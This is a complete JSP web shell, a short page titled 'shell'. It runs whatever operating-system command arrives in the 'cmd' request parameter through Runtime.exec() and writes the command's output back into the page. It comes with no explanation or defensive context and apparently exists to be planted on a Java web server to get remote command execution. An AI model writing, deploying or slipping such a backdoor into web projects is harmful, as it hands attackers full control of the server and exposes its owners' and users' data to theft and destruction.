
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <title>shell</title>
</head>
<body>
<% if(request.getParameter("cmd")!=null){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
}

%>
</body>
</html>
